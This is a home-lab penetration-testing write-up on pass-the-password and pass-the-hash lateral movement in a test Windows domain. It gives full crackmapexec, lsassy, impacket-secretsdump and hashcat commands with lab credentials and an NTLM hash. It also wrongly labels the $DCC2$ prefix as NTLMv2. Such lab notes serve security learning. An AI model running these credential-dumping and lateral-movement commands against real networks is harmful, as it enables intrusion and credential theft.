Setup win2022 server: 192.168.64.138  
Setup Peterparker: \192.168.64.140  
Setup Frankcastle: 192.168.64.139  
Kali: \192.168.64.129/24  

---

## 🚩 'Pass Attacks' - Pass the Password  

### Pass the Password  
With a SAM dump and cracked hash, we have the ability to push the credentials around with every device that has the ability to recieve and accept the login attempt.  

crackmapexec SMB Password abuse: 

    crackmapexec smb 192.168.64.0/24 -u fcastle -d MARVEL.local -p Password1

![image](https://github.com/user-attachments/assets/025b48ea-6702-4094-ae25-c54168fb1607)
We can see that the username and password has been passed around the network and was successful only on Spiderman and Thepunisher devices. Although there was a succesful authentication on Hyrda-DC, fcastle is not a local admin on that device therefore there is no login. 

---

## 🚩 'Pass Attacks' - Pass the Hash  
With a SAM dump containing local Admin credentials (likely gathered during the initial attack stage), we can also pass a local admin account username with hash around the network and observe which devices accept these credentials.

crackmapexec SMB Hash abuse:

    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth

![image](https://github.com/user-attachments/assets/13e70253-c999-4110-baf0-1cab4d1841f4)  
Local admin account succesful for Spiderman and Thepunisher  

### Note 1 Information gathering  
**Adding the below flags behind --local-auth:**  
--sam (dumps all local SAM files found)  
--shares (shows all accessbile shares)  
--lsa (local security authority)  

    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth --sam

### Note 2 (SMB) Modules  
**crackmapexec smb -L will list out all the modules we can use with SMB by adding -M behind --local-auth:**  
-L  
-M Lsassy  

    crackmapexec smb -L
    crackmapexec smb 192.168.64.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc --local-auth -M lsassy  

### Note 3 crackmapexec database

    root@kali:/home/kali# cmedb
    cmedb (default)(smb) > help
![image](https://github.com/user-attachments/assets/d758e9f9-056b-40b3-ac2e-262eac9cd2b6)  

---

## 🚩 Dumping and Cracking Hashes (Secretsdump) with password
With impacket(secretsdump) we will now use a known account credentials to dump the secrets of the machine to see further information. This can present further SAM dumps, domain admin passwords in clear texts and vulnerabile protocols such as wdigest existing on older machines which could be force / enabled for abuse.  

    impacket-secretsdump MARVEL.local/fcastle:'Password1'@192.168.64.139
    
![image](https://github.com/user-attachments/assets/8fc185f1-06ba-4f4f-bd89-968163496df4)  
SAM hashes to note: Admin, User accounts, DCC

## 🚩 Dumping and Cracking Hashes (Secretsdump) with hash
Secretsdump can also provide further information of a device in the event the passwords cannot be cracked. 

    /home/kali# impacket-secretsdump administrator@192.168.64.139 -hashes aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc
    
![image](https://github.com/user-attachments/assets/a1c69bd3-1ac7-44be-8bc4-9a43d31fc827)  
In this case we could see an account with username Administrator with the "$DCC2$" which is usually the prefix for ntlmv2 hashing with the hash we could potentially attempt to crack and maybe attain a password for a domain administrator.  

whenever we come across new hashes through the Post Compromise lateral movement, we want to atleast attempt a password crack. The below example, will use hashcat to crack a ntlm hash.

    hashcat -m 1000 ntlm.txt
